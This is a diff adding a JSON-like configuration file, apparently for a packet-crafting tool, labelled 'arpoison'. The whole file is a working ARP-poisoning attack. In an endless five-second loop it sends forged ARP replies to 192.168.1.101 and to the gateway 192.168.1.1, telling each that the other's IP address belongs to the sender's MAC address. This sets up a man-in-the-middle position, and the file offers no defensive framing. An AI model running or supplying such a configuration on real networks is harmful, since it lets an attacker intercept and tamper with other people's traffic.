@@ -1,0 +1,62 @@
+[
+    {
+        "_comment": "arpoison to 192.168.1.1 and 192.168.1.101",
+        "Socket-type": "Data-link",
+        "Option": {
+            "Device": "en0",
+            "Infinite loop": "enable",  /*Enable infinite loop*/
+            "Interval": 5000000         /*Interval: 5s*/
+        },
+        "Sequence": [
+            /*Send frame of target 1*/
+            {
+                "Send Packet": [
+                    {
+                        "Ethernet": {
+                            "Destination MAC Address": "lookup_mac_address(192.168.1.101)",
+                            "Source MAC Address": "myself",
+                            "Type": "ETHERTYPE_ARP"
+                        }
+                    },
+                    {
+                        "ARP": {
+                            "Operation": "ARPOP_REPLY", /*Operation is reply*/
+                            "Sender Hardware Address": "myself",
+                            "Sender Protocol Address": "192.168.1.1",
+                            /*Target 1 is 192.168.1.101*/
+                            "Target Hardware Address": "lookup_mac_address(192.168.1.101)",
+                            "Target Protocol Address": "192.168.1.101"
+                        }
+                    },
+                    {
+                        "Packet Option": {
+                            "Interval": 10000   /*There must be a slight interval between the two packets, 0.01*/
+                        }
+                    }
+                ]
+            },
+            /*Send frame of target 2*/
+            {
+                "Send Packet": [
+                    {
+                        "Ethernet": {
+                            "Destination MAC Address": "lookup_mac_address(192.168.1.1)",
+                            "Source MAC Address": "myself",
+                            "Type": "ETHERTYPE_ARP"
+                        }
+                    },
+                    {
+                        "ARP": {
+                            "Operation": "ARPOP_REPLY",  /*Operation is reply*/
+                            "Sender Hardware Address": "myself",
+                            "Sender Protocol Address": "192.168.1.101",
+                            /*Target 2 is 192.168.1.1*/
+                            "Target Hardware Address": "lookup_mac_address(192.168.1.1)",
+                            "Target Protocol Address": "192.168.1.1"
+                        }
+                    }
+                ]
+            }
+        ]
+    }
+]
